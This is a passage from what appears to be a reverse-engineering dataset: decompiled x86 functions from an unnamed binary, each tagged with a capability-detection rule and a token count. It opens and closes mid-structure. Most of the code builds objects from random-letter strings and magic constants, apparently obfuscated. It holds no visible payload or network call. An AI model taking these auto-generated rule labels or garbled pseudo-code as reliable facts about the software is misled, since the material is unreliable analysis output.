        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.00412880(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    int32_t aiStack436 [30];\n    uchar auStack316 [20];\n    uchar *puStack296;\n    uchar *var_11ch;\n    uchar *var_118h;\n    uchar *var_114h;\n    uchar *var_110h;\n    uint *var_10ch;\n    uchar *var_108h;\n    uint *var_104h;\n    uchar *var_100h;\n    uchar *var_fch;\n    uchar *var_f8h;\n    uchar *var_f4h;\n    int32_t *var_f0h;\n    int32_t *var_ech;\n    uchar *var_e8h;\n    int32_t *var_e4h;\n    uchar *var_e0h;\n    uchar *var_dch;\n    uint *var_d8h;\n    uchar *var_d4h;\n    uint *var_d0h;\n    uchar *var_cch;\n    int32_t *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    int32_t *var_bch;\n    int32_t *var_b8h;\n    int32_t *var_b4h;\n    uchar *var_b0h;\n    int32_t *var_ach;\n    uchar *var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar8;\n    \n    var_1ch = &fcn.00412880::var_11ch;\n    var_10h = 0xffffffff;\n    var_14h = 0x418310;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00412880::var_18h;\n    var_a4h = param_1 + 4;\n    var_9ch = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_a0h = var_9ch + 0x34;\n    fcn.004040a7();\n    var_10h = 1;\n    var_b0h = &stack0xfffffedc;\n    puStack296 = 0x4128fd;\n    fcn.0040486d(0x8de);\n    var_ach = &stack0xfffffe4c;\n    var_a8h = &stack0xfffffec4;\n    puStack296 = &stack0xfffffedc;\n    fcn.00401e79(\"gmhhvrgzsspdonwngtkswpmtickrliykwsxuyzenmapufkzqjuxxjdfhakgdbjy\");\n    var_b4h = var_ach + 0x18;\n    var_10h = 6;\n    fcn.00401e79(\"jmvarmjqwoytlpnyhnjyxfwjrjeyoekxvlkehhevagmuxbgrwjbxfrtlovpgevxlseujfrxojhachmaijpkekknnxsffcapa\");\n    var_b8h = var_ach + 0xf;\n    var_10h = 7;\n    fcn.00401e79(\"mhhlpporopboaduogjgidcweosdwmdhiemqobwxcozwcjlogfsbhjviztfrava\");\n    var_bch = var_ach + 9;\n    var_10h = 8;\n    fcn.00401e79(\"xmaxhgvtrkxhjhwdtzalxmdynzkcyokuysilrivrnhzpgvtljqhihqzbybyognijtfqsrciwyzihodneihdvpoocu\");\n    var_10h = 9;\n    arg_8h = \"dkfhuhajhxfmbokrqseodvxqxzzmultlhlfphgotudfnjrkhtntmtglk\";\n    fcn.00401e79(\"dkfhuhajhxfmbokrqseodvxqxzzmultlhlfphgotudfnjrkhtntmtglk\");\n    piVar4 = var_ach;\n    *var_ach = &fcn.00412880::var_38h;\n    piVar4[2] = 0x40b53200;\n    piVar4[1] = 0;\n    piVar4[0x16] = 0x40be3800;\n    piVar4[0x15] = 0;\n    piVar4[0x17] = 0x66e;\n    var_10h = 1;\n    fcn.0040299b(arg_8h);\n    puVar2 = var_b0h;\n    *(var_b0h + -4) = 0x412a34;\n    fcn.00403b02();\n    var_c4h = puVar2;\n    var_c0h = puVar2 + -0x4c;\n    *(puVar2 + -0x50) = \"ggktxaiuwtotrecmdueayeuwrqzjufswcibma\";\n    *(puVar2 + -0x54) = 0x412a5c;\n    fcn.00401e79(*(puVar2 + -0x50));\n    puVar1 = var_c0h;\n    *var_c0h = 0;\n    *(puVar1 + 4) = 0x1355;\n    *(puVar1 + 0xc) = 0x408c0000;\n    *(puVar1 + 8) = 0;\n    *(puVar1 + 0x14) = 0x40a5ba00;\n    *(puVar1 + 0x10) = 0;\n    *(puVar1 + 0x30) = 0x9aa;\n    *(puVar1 + 0x34) = 0x2e6;\n    puVar1[0x38] = 0;\n    *(puVar1 + 0x40) = 0x40cc2f80;\n    *(puVar1 + 0x3c) = 0;\n    *(puVar1 + 0x48) = 0x40d32b80;\n    *(puVar1 + 0x44) = 0;\n    *(puVar2 + -0x54) = 0x412ac6;\n    fcn.00403715(*(puVar2 + -0x50));\n    puVar1 = var_c4h;\n    var_cch = var_c4h;\n    *(var_c4h + -4) = var_c4h;\n    var_c8h = puVar1 + -0x3c;\n    *(puVar1 + -0x40) = \"licrgkqdnuqfxtcuqbxoqteamhoapaesxwnviwurwxgojagbnicdpycsdq\";\n    *(puVar1 + -0x44) = 0x412af9;\n    fcn.00401e79(*(puVar1 + -0x40));\n    piVar4 = var_c8h;\n    *var_c8h = &fcn.00412880::var_50h;\n    piVar4[2] = 0x40c13b00;\n    piVar4[1] = 0;\n    piVar4[3] = 0x6fa;\n    piVar4[4] = 0xe76;\n    *(piVar4 + 5) = 0;\n    piVar4[0xc] = 0x1087;\n    *(piVar4 + 0xd) = 0;\n    piVar4[0xe] = 0x9da;\n    *(puVar1 + -0x44) = 0x412b46;\n    fcn.0040168b(*(puVar1 + -0x40));\n    puVar1 = var_cch;\n    *(var_cch + -4) = 0x412b5b;\n    fcn.00403b02();\n    var_d4h = puVar1;\n    var_d0h = puVar1 + -0x24;\n    *(puVar1 + -0x28) = \"vipemqbjhgxcxnsbkpxyqwtmhvzejx\";\n    *(puVar1 + -0x2c) = 0x412b83;\n    fcn.00401e79(*(puVar1 + -0x28));\n    puVar3 = var_d0h;\n    var_d0h[1] = 0x40703000;\n    *puVar3 = 0;\n    puVar3[8] = 0x29f;\n    *(puVar1 + -0x2c) = 0x412bad;\n    fcn.004010e1(*(puVar1 + -0x28));\n    puVar1 = var_d4h;\n    var_dch = var_d4h;\n    *(var_d4h + -4) = var_d4h;\n    var_d8h = puVar1 + -0x48;\n    *(puVar1 + -0x4c) = \"guytxlqghybsljthahiytutejtuqktoxifnsprtcyavieyhlmwyobczbfff\";\n    *(puVar1 + -0x50) = 0x412bde;\n    fcn.00401e79(*(puVar1 + -0x4c));\n    puVar3 = var_d8h;\n    var_d8h[1] = 0x40478000;\n    *puVar3 = 0;\n    puVar3[2] = 0x5a3;\n    puVar3[4] = 0x40d908c0;\n    puVar3[3] = 0;\n    puVar3[5] = 0x594;\n    puVar3[0xd] = 0x40d042c0;\n    puVar3[0xc] = 0;\n    puVar3[0xe] = 0x7ef;\n    *(puVar3 + 0xf) = 1;\n    puVar3[0x11] = 0x40d41d00;\n    puVar3[0x10] = 0;\n    *(puVar1 + -0x50) = 0x412c44;\n    fcn.004048f9(*(puVar1 + -0x4c));\n    puVar1 = var_dch;\n    var_e8h = var_dch;\n    *(var_dch + -4) = var_dch;\n    var_e4h = puVar1 + -0x78;\n    var_e0h = puVar1 + -0x18;\n    *(puVar1 + -0x7c) = \"zzlwfeyxjppewzvfbeeluosryoboqywoanupzawhcpatngkuzaachydjrvpfllaflsw\";\n    *(puVar1 + -0x80) = 0x412c80;\n    fcn.00401e79(*(puVar1 + -0x7c));\n    var_ech = var_e4h + 0x10;\n    var_10h = 3;\n    *(puVar1 + -0x80) = \"lyoarbjcptdoiuukjenzqbcwsrfagbarhdrkqxyuulcqghmopqmgkgxfxehdtwpim\";\n    *(puVar1 + -0x84) = 0x412cab;\n    fcn.00401e79(*(puVar1 + -0x80));\n    var_f0h = var_e4h + 10;\n    var_10h = 4;\n    *(puVar1 + -0x84) = \"agpltsvaaufaxnfavqpmsdcnherogtffpyajivlywmjxvexrlhvtozrumlprafsvc\";\n    *(puVar1 + -0x88) = 0x412cd6;\n    fcn.00401e79(*(puVar1 + -0x84));\n    var_10h = 5;\n    *(puVar1 + -0x88) = \"uxmzkuiptwqbvuooakzvstdrxomyeeengcsquvsdbbomnygeaikwqslkqnzrruhuaazmhaalazfpwh\";\n    *(puVar1 + -0x8c) = 0x412cfb;\n    fcn.00401e79(*(puVar1 + -0x88));\n    piVar4 = var_e4h;\n    *var_e4h = &fcn.00412880::var_68h;\n    piVar4[1] = 0x68c;\n    piVar4[9] = 0x4091f000;\n    piVar4[8] = 0;\n    piVar4[0x17] = 0x40d14680;\n    piVar4[0x16] = 0;\n    var_10h = 1;\n    *(puVar1 + -0x8c) = 0x412d40;\n    fcn.004041bf(*(puVar1 + -0x88));\n    puVar2 = var_e8h;\n    *(var_e8h + -4) = 0x412d55;\n    fcn.00403b02();\n    var_f4h = puVar2 + -0x2c;\n    var_100h = puVar2 + -0x2c;\n    *(puVar2 + -0x2c) = &fcn.00412880::var_80h;\n    *(puVar2 + -4) = 0x40c45680;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0x14) = 0x40d47500;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x20) = 0x40c57300;\n    *(puVar2 + -0x24) = 0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x10) = 0xd1;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0x28) = 1;\n    *(puVar2 + -0x30) = 0x412db6;\n    fcn.00405506(*(puVar2 + -0x2c), *(puVar2 + -0x28), *(puVar2 + -0x24), *(puVar2 + -0x20), *(puVar2 + -0x1c), \n                 *(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8));\n    *(puVar2 + -0x30) = 0x412dc3;\n    fcn.00403b02();\n    var_fch = puVar2 + -0x7c;\n    var_f8h = puVar2 + -0x48;\n    *(puVar2 + -0x80) = \"jlqmdcrmqbtjyvrzlloptos\";\n    *(puVar2 + -0x84) = 0x412df1;\n    fcn.00401e79(*(puVar2 + -0x80));\n    var_10h = 2;\n    *(puVar2 + -0x84) = \"uqkvheibjhutxxc\";\n    *(puVar2 + -0x88) = 0x412e13;\n    fcn.00401e79(*(puVar2 + -0x84));\n    puVar1 = var_fch;\n    *(var_fch + 0x1c) = 0x40c3df00;\n    *(puVar1 + 0x18) = 0;\n    *(puVar1 + 0x20) = 0x391;\n    *(puVar1 + 0x24) = 0x1ecd;\n    puVar1[0x28] = 0;\n    puVar1[0x2c] = 0;\n    puVar1[0x30] = 0;\n    *(puVar1 + 0x4c) = 0x14d1;\n    var_10h = 1;\n    *(puVar2 + -0x88) = 0x412e5f;\n    fcn.00404fb6(*(puVar2 + -0x84));\n    puVar1 = var_100h;\n    puVar5 = var_100h + -4;\n    var_108h = var_100h + -4;\n    *(var_100h + -4) = 0;\n    *(puVar1 + -8) = 0x412e82;\n    fcn.00403792(*puVar5);\n    *(puVar1 + -8) = 0x412e92;\n    fcn.00404435();\n    var_104h = puVar1 + -0x40;\n    *(puVar1 + -0x44) = \"sgdjubsynijiqppikspfsnpszxcftbyeqwxghdgkrclaksggpnpwxxguqkhemlalhfyqnfrwvqypocajcerwwdnxkh\";\n    *(puVar1 + -0x48) = 0x412ebf;\n    fcn.00401e79(*(puVar1 + -0x44));\n    puVar3 = var_104h;\n    var_104h[1] = 0x40d2d180;\n    *puVar3 = 0;\n    puVar3[2] = 0x2b4;\n    puVar3[4] = 0x40b5e900;\n    puVar3[3] = 0;\n    *(puVar3 + 5) = 1;\n    puVar3[0xd] = 0x40cc0d00;\n    puVar3[0xc] = 0;\n    *(puVar3 + 0xe) = 1;\n    *(puVar1 + -0x48) = 0x412f0d;\n    fcn.00401b54(*(puVar1 + -0x44));\n    puVar1 = var_108h;\n    var_110h = var_108h;\n    *(var_108h + -4) = var_108h;\n    var_10ch = puVar1 + -0x38;\n    *(puVar1 + -0x3c) = \"jjwateeqxwwceulmfndigfdfxyglugpmahdjeoirtralkucbjdvzfmnjismvfyduedxzdrjembzxsyzlpwdacovcrkhhev\"\n    ;\n    *(puVar1 + -0x40) = 0x412f40;\n    fcn.00401e79(*(puVar1 + -0x3c));\n    puVar3 = var_10ch;\n    *var_10ch = 0x162;\n    *(puVar3 + 1) = 1;\n    puVar3[2] = 0x12f;\n    puVar3[4] = 0x40976800;\n    puVar3[3] = 0;\n    *(puVar3 + 5) = 0;\n    *(puVar3 + 6) = 0;\n    puVar3[0xd] = 0x3f4;\n    *(puVar1 + -0x40) = 0x412f84;\n    fcn.00406429(*(puVar1 + -0x3c));\n    puVar2 = var_110h;\n    puVar6 = var_110h + -4;\n    *(var_110h + -4) = 0;\n    *(puVar2 + -8) = 0x412fa9;\n    fcn.004045b1(*puVar6);\n    *(puVar2 + -0x18) = &fcn.00412880::var_98h;\n    *(puVar2 + -0xc) = 0x40e1f2c0;\n    *(puVar2 + -0x10) = 0;\n    *(puVar2 + -8) = 1;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -0x1c) = 0x412fdd;\n    fcn.00404953(*(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8));\n    *(puVar2 + -0x1c) = 0x412fed;\n    fcn.00403b02();\n    var_118h = puVar2 + -0x1c;\n    *(puVar2 + -0x1c) = 0x493;\n    *(puVar2 + -0x20) = 0x413003;\n    fcn.004041e7(*(puVar2 + -0x1c));\n    var_114h = puVar2 + -0x50;\n    *(puVar2 + -0x54) = \"dkrywkfeazgaxwyzejzlvxxdngvxycjmxxgpkrezrxoaiynolndagkwbdxieltdjekbe\";\n    *(puVar2 + -0x58) = 0x41302b;\n    fcn.00401e79(*(puVar2 + -0x54));\n    puVar1 = var_114h;\n    *var_114h = 1;\n    *(puVar1 + 8) = 0x40d5c040;\n    *(puVar1 + 4) = 0;\n    *(puVar1 + 0x28) = 0x40e44b00;\n    *(puVar1 + 0x24) = 0;\n    *(puVar1 + 0x30) = 0x40962800;\n    *(puVar1 + 0x2c) = 0;\n    *(puVar2 + -0x58) = 0x41306e;\n    fcn.00406028(*(puVar2 + -0x54));\n    puVar1 = var_118h;\n    puVar7 = var_118h + -0x14;\n    puVar8 = var_118h + -0x14;\n    *(var_118h + -0xc) = 0x40a60200;\n    *(puVar1 + -0x10) = 0;\n    *(puVar1 + -4) = 0x2a1;\n    *(puVar1 + -8) = 0x38d;\n    *puVar7 = 0;\n    *(puVar1 + -0x18) = 0x4130aa;\n    fcn.00404327(*puVar8, *(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8), *(puVar1 + -4));\n    *(puVar1 + -0x18) = 0x40e2d960;\n    *(puVar1 + -0x1c) = 0;\n    *(puVar1 + -0x24) = 0x40e5f460;\n    *(puVar1 + -0x28) = 0;\n    *(puVar1 + -0x20) = 1;\n    *(puVar1 + -0x2c) = 1;\n    *(puVar1 + -0x30) = 0x4130e8;\n    fcn.00401c8a(*(puVar1 + -0x2c), *(puVar1 + -0x28), *(puVar1 + -0x24), *(puVar1 + -0x20), *(puVar1 + -0x1c));\n    var_11ch = puVar1 + -0x5c;\n    *(puVar1 + -0x30) = 0x40e786e0;\n    *(puVar1 + -0x34) = 0;\n    *(puVar1 + -0x38) = 0x40e10260;\n    *(puVar1 + -0x3c) = 0;\n    *(puVar1 + -0x48) = 0x40dba9c0;\n    *(puVar1 + -0x4c) = 0;\n    *(puVar1 + -0x58) = 0x40e5c8c0;\n    *(puVar1 + -0x5c) = 0;\n    *(puVar1 + -0x40) = 1;\n    *(puVar1 + -0x44) = 1;\n    *(puVar1 + -0x50) = 1;\n    *(puVar1 + -0x54) = 0x9a5;\n    *(puVar1 + -0x60) = 0x413158;\n    fcn.00404b79(*(puVar1 + -0x5c), *(puVar1 + -0x58), *(puVar1 + -0x54), *(puVar1 + -0x50), *(puVar1 + -0x4c), \n                 *(puVar1 + -0x48), *(puVar1 + -0x44), *(puVar1 + -0x40), *(puVar1 + -0x3c), *(puVar1 + -0x38), \n                 *(puVar1 + -0x34));\n    *(puVar1 + -0x60) = 0;\n    *(puVar1 + -100) = 1;\n    *(puVar1 + -0x68) = 0x41317c;\n    fcn.00402f68(*(puVar1 + -100), *(puVar1 + -0x60));\n    *in_FS_OFFSET = var_18h;\n    return var_9ch;\n}\n",
        "token_count": 6002
    },
    "0041d2d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d2d0(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404ee9(arg_8h);\n    *in_ECX = vtable.std::bad_array_new_length.0;\n    return;\n}\n",
        "token_count": 76
    },
    "0041e290": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e290(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401ae1(arg_8h);\n    *in_ECX = vtable.std::ios_base::failure.0;\n    return;\n}\n",
        "token_count": 74
    },
    "00424100": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424100(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401e79(*(in_ECX + 8));\n    return arg_8h;\n}\n",
        "token_count": 64
    },
    "00424140": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424140(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401e79(*(in_ECX + 0x10));\n    return arg_8h;\n}\n",
        "token_count": 66
    },
    "00424180": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424180(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401e79(*(in_ECX + 0x14));\n    return arg_8h;\n}\n",
        "token_count": 66
    },
    "00426090": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426090(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004045fc(arg_8h);\n    *in_ECX = vtable.std::bad_cast.0;\n    return;\n}\n",
        "token_count": 70
    },
    "00427f40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.00427f40(int32_t param_1)\n\n{\n    uchar *puVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack252 [10];\n    uchar auStack212 [36];\n    uchar *puStack176;\n    uchar *var_94h;\n    int32_t *var_90h;\n    uchar *var_8ch;\n    int32_t *var_88h;\n    uchar *var_84h;\n    uint *var_80h;\n    uchar *var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_1ch = &fcn.00427f40::var_94h;\n    var_10h = 0xffffffff;\n    var_14h = 0x44fea0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00427f40::var_18h;\n    var_78h = param_1 + 0x1c;\n    var_6ch = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_74h = var_6ch + 0x34;\n    fcn.004040a7();\n    var_70h = var_6ch + 0x50;\n    fcn.004040a7();\n    var_10h = 2;\n    var_84h = &stack0xffffff54;\n    puStack176 = 0x427fd8;\n    fcn.00401c6c(0, 0xc2e, 0xef6, 0xf3d, 0xf0f);\n    var_80h = &stack0xffffff04;\n    var_7ch = &stack0xffffff2c;\n    puStack176 = &stack0xffffff54;\n    fcn.00401e79(0x544a21);\n    var_10h = 3;\n    arg_8h = \"efvkvnaqbamifelicixohyjgqjadffxkerkcqokzsssgnu\";\n    fcn.00401e79(\"efvkvnaqbamifelicixohyjgqjadffxkerkcqokzsssgnu\");\n    puVar3 = var_80h;\n    var_80h[1] = 0x40e42f00;\n    *puVar3 = 0;\n    *(puVar3 + 8) = 1;\n    puVar3[9] = 0x14c1;\n    *(puVar3 + 0x10) = 1;\n    puVar3[0x11] = 0x1046;\n    puVar3[0x12] = 0x16e1;\n    puVar3[0x13] = 0x1cd4;\n    var_10h = 2;\n    fcn.0040344f(arg_8h);\n    puVar1 = var_84h;\n    puVar4 = var_84h + -0xc;\n    *(var_84h + -0xc) = &fcn.00427f40::var_38h;\n    *(puVar1 + -4) = 0xea2;\n    *(puVar1 + -8) = 1;\n    *(puVar1 + -0x10) = 0x42809d;\n    fcn.004019f1(*puVar4, *(puVar1 + -8), *(puVar1 + -4));\n    *(puVar1 + -0x10) = 0x4280aa;\n    fcn.00403b02();\n    var_8ch = puVar1 + -0x20;\n    *(puVar1 + -0x10) = 0x40db9040;\n    *(puVar1 + -0x14) = 0;\n    *(puVar1 + -0x18) = 0x40e0cca0;\n    *(puVar1 + -0x1c) = 0;\n    *(puVar1 + -0x20) = 0;\n    *(puVar1 + -0x24) = 0x4280d9;\n    fcn.00405db7(*(puVar1 + -0x20), *(puVar1 + -0x1c), *(puVar1 + -0x18), *(puVar1 + -0x14));\n    *(puVar1 + -0x24) = puVar1 + -0x20;\n    var_88h = puVar1 + -0x48;\n    *(puVar1 + -0x4c) = \"josfiurcpxgonhpsvbekdjrnzijxuljokhxzstbc\";\n    *(puVar1 + -0x50) = 0x428107;\n    fcn.00401e79(*(puVar1 + -0x4c));\n    piVar2 = var_88h;\n    *var_88h = &fcn.00427f40::var_50h;\n    *(piVar2 + 1) = 1;\n    *(piVar2 + 8) = 0;\n    *(piVar2 + 9) = 1;\n    *(puVar1 + -0x50) = 0x42812b;\n    fcn.00402d3d(*(puVar1 + -0x4c));\n    puVar1 = var_8ch;\n    *(var_8ch + -4) = 0x428140;\n    fcn.00403b02();\n    var_94h = puVar1;\n    var_90h = puVar1 + -0x30;\n    *(puVar1 + -0x34) = \"lrkxhzpstsy\";\n    *(puVar1 + -0x38) = 0x428168;\n    fcn.00401e79(*(puVar1 + -0x34));\n    piVar2 = var_90h;\n    *var_90h = &fcn.00427f40::var_68h;\n    *(piVar2 + 1) = 0;\n    piVar2[3] = 0x40dcc000;\n    piVar2[2] = 0;\n    piVar2[0xb] = 0x40e2eee0;\n    piVar2[10] = 0;\n    *(puVar1 + -0x38) = 0x4281a0;\n    fcn.004056fa(*(puVar1 + -0x34));\n    puVar1 = var_94h;\n    *(var_94h + -4) = 0x4281b5;\n    fcn.00403b02();\n    *(puVar1 + -4) = 0x4281bd;\n    fcn.00401f4b();\n    *in_FS_OFFSET = var_18h;\n    return var_6ch;\n}\n",
        "token_count": 1673
    },
    "0042a170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.0042a170(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    uint *puVar7;\n    uint *puVar10;\n    uint *puVar12;\n    uint *puVar13;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    int32_t aiStack352 [11];\n    uint uStack308;\n    uchar *var_12ch;\n    int32_t *var_128h;\n    uchar *var_124h;\n    int32_t *var_120h;\n    uchar *var_11ch;\n    uint *var_118h;\n    uchar *var_114h;\n    uint *var_110h;\n    uchar *var_10ch;\n    uchar *var_108h;\n    uchar *var_104h;\n    uchar *var_100h;\n    uchar *var_fch;\n    uchar *var_f8h;\n    uint *var_f4h;\n    uchar *var_f0h;\n    uint *var_ech;\n    uchar *var_e8h;\n    uint *var_e4h;\n    uchar *var_e0h;\n    uint *var_dch;\n    uchar *var_d8h;\n    uchar *var_d4h;\n    uchar *var_d0h;\n    uchar *var_cch;\n    uchar *var_c8h;\n    uint *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uchar *var_b8h;\n    uint *var_b4h;\n    uchar *var_b0h;\n    uint *var_ach;\n    int32_t *var_a8h;\n    uchar *var_a4h;\n    int32_t *var_a0h;\n    uchar *var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    uint *var_88h;\n    int32_t *var_84h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar6;\n    uint *puVar8;\n    uchar *puVar9;\n    uchar *puVar11;\n    uint *puVar14;\n    \n    var_1ch = &fcn.0042a170::var_12ch;\n    var_88h = &fcn.0042a170::var_12ch;\n    var_10h = 0xffffffff;\n    var_14h = 0x450020;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0042a170::var_18h;\n    var_98h = param_1 + 0xc;\n    uStack308 = 0x42a1bc;\n    var_90h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_94h = var_90h + 0x28;\n    uStack308 = 0x42a1d0;\n    fcn.004040a7();\n    var_8ch = var_90h + 0x4c;\n    uStack308 = 0x42a1e4;\n    fcn.004040a7();\n    var_84h = &stack0xfffffea0;\n    var_10h = 2;\n    arg_8h = \"zjbfzqnbvltsufrnysifdfpipknmzasdvntioxwarvchrsx\";\n    fcn.00401e79(\"zjbfzqnbvltsufrnysifdfpipknmzasdvntioxwarvchrsx\");\n    piVar1 = var_84h;\n    *var_84h = &fcn.0042a170::var_38h;\n    piVar1[1] = 0xa67;\n    piVar1[3] = 0x40cc3380;\n    piVar1[2] = 0;\n    *(piVar1 + 4) = 0;\n    *(piVar1 + 0xb) = 1;\n    fcn.00404872(arg_8h);\n    puVar2 = var_88h;\n    *(var_88h + -4) = 0x42a260;\n    fcn.00403b02();\n    var_a4h = puVar2;\n    var_a0h = puVar2 + -0x68;\n    var_9ch = puVar2 + -0x18;\n    *(puVar2 + -0x6c) = \"netwsvuhqbfibycxdmdcigidxlvtupvoegwpujrsmwjetmtggalacfnme\";\n    *(puVar2 + -0x70) = 0x42a28e;\n    fcn.00401e79(*(puVar2 + -0x6c));\n    var_a8h = var_a0h + 0xb;\n    var_10h = 0xc;\n    *(puVar2 + -0x70) =\n         \"corvxzkbtjzsindrimngatujytydqigswxhjgpfmzmsxemguupirhhnzpqlfmmrdslqgxghvvmrucrtibzpwiupxgubpxyiu\";\n    *(puVar2 + -0x74) = 0x42a2b9;\n    fcn.00401e79(*(puVar2 + -0x70));\n    var_10h = 0xd;\n    *(puVar2 + -0x74) =\n         \"qkuqlzcndvjbaahukhgqvvascipuuzcysckpmdxcnbvvhkrghjvlhcbukxhhzymrstfwsqwwwpcdcjhqcmbewiaiyqaxkffalrw\";\n    *(puVar2 + -0x78) = 0x42a2de;\n    fcn.00401e79(*(puVar2 + -0x74));\n    piVar1 = var_a0h;\n    *var_a0h = &fcn.0042a170::var_50h;\n    *(piVar1 + 1) = 0;\n    piVar1[2] = 0x259;\n    piVar1[9] = 0x3c3;\n    *(piVar1 + 10) = 1;\n    piVar1[0x12] = 0x4084f800;\n    piVar1[0x11] = 0;\n    *(piVar1 + 0x13) = 1;\n    var_10h = 2;\n    *(puVar2 + -0x78) = 0x42a328;\n    fcn.00405e5c(*(puVar2 + -0x74));\n    puVar2 = var_a4h;\n    *(var_a4h + -4) = 0x42a33d;\n    fcn.00403b02();\n    var_b0h = puVar2;\n    var_ach = puVar2 + -0x40;\n    *(puVar2 + -0x44) = \"zceaoqbrbxpejnezsuohtxzhcfqrfakcykbtvukklcazcgxumvjgpluaze\";\n    *(puVar2 + -0x48) = 0x42a365;\n    fcn.00401e79(*(puVar2 + -0x44));\n    puVar3 = var_ach;\n    *var_ach = 0x10d2;\n    *(puVar3 + 1) = 1;\n    puVar3[3] = 0x40d46ac0;\n    puVar3[2] = 0;\n    puVar3[5] = 0x40bfd500;\n    puVar3[4] = 0;\n    *(puVar3 + 0xc) = 0;\n    *(puVar3 + 0xd) = 1;\n    *(puVar3 + 0xe) = 1;\n    *(puVar3 + 0xf) = 1;\n    *(puVar2 + -0x48) = 0x42a3b1;\n    fcn.00401dc0(*(puVar2 + -0x44));\n    puVar2 = var_b0h;\n    var_b8h = var_b0h;\n    *(var_b0h + -4) = var_b0h;\n    var_b4h = puVar2 + -0x2c;\n    *(puVar2 + -0x30) = \"xztxwcfomxkkjvumhjolpenfgitviypdpzvgflsjkgauohznzywuwb\";\n    *(puVar2 + -0x34) = 0x42a3e2;\n    fcn.00401e79(*(puVar2 + -0x30));\n    puVar3 = var_b4h;\n    *var_b4h = 0x1539;\n    puVar3[2] = 0x40c9b080;\n    puVar3[1] = 0;\n    puVar3[4] = 0x40e44ac0;\n    puVar3[3] = 0;\n    *(puVar2 + -0x34) = 0x42a41a;\n    fcn.0040158c(*(puVar2 + -0x30));\n    puVar2 = var_b8h;\n    var_bch = var_b8h;\n    *(var_b8h + -4) = var_b8h;\n    *(puVar2 + -0x1c) = \"xnnzgnyltzpeyjkzluubnwzgwemxtyhbnjaktgitnidpoqwjycc\";\n    *(puVar2 + -0x20) = 0x42a445;\n    